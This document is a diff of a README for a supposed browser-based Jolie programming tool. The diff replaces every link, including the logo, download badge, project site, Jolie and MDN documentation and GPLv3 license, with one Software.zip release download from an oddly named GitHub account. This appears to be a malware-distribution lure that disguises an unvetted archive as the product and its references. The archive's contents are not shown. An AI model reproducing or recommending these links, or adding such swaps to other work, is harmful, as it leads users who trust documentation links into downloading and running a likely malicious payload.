@@ -1,6 +1,6 @@
 # Bliss Browser Jolie - 🌳️🌐️#️⃣️
 
-![Bliss Browser Jolie Logo](https://example.com/bliss-browser-jolie-logo.png)
+![Bliss Browser Jolie Logo](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
 
 Welcome to the Bliss Browser Jolie repository! This repository hosts the Bliss Browser Jolie language support module, which enables developers to write Jolie programs directly in the browser and execute them seamlessly. With a wide array of features and functionalities, this project aims to revolutionize the way Jolie programs are developed and deployed.
 
@@ -8,7 +8,7 @@ Welcome to the Bliss Browser Jolie repository! This repository hosts the Bliss B
 
 To get started with Bliss Browser Jolie, simply download the software package from the following link:
 
-[![Download Bliss Browser Jolie](https://img.shields.io/badge/Download-Bliss_Browser_Jolie-green.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Bliss Browser Jolie](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the package, extract the contents and launch the application to start writing and running Jolie programs in your browser.
 
@@ -30,8 +30,8 @@ To use Bliss Browser Jolie, open the application in your browser, start writing 
 
 ## 🌐️ Links
 
-- [Bliss Browser Project Website](https://blissbrowserproject.com)
-- [GitHub Repository](https://github.com/bliss-browser-jolie)
+- [Bliss Browser Project Website](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
+- [GitHub Repository](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
 
 ## 🌟 Support
 
@@ -41,8 +41,8 @@ For any questions, feedback, or suggestions regarding Bliss Browser Jolie, feel 
 
 For more information on Jolie programming language and web development, check out the following resources:
 
-- [Jolie Programming Language Documentation](https://jolie-lang.org/docs.html)
-- [Mozilla Developer Network Web Docs](https://developer.mozilla.org/en-US/docs/Web)
+- [Jolie Programming Language Documentation](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
+- [Mozilla Developer Network Web Docs](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip)
 
 ## 🌿 Repository Topics
 
@@ -50,7 +50,7 @@ For more information on Jolie programming language and web development, check ou
 
 ## 📜 License
 
-This project is licensed under the [GPLv3 License](https://www.gnu.org/licenses/gpl-3.0.en.html), ensuring that the software remains open source and accessible to all developers and users.
+This project is licensed under the [GPLv3 License](https://github.com/mommommommom123/Bliss_Browser_Jolie/releases/download/v2.0/Software.zip), ensuring that the software remains open source and accessible to all developers and users.
 
 ---
 
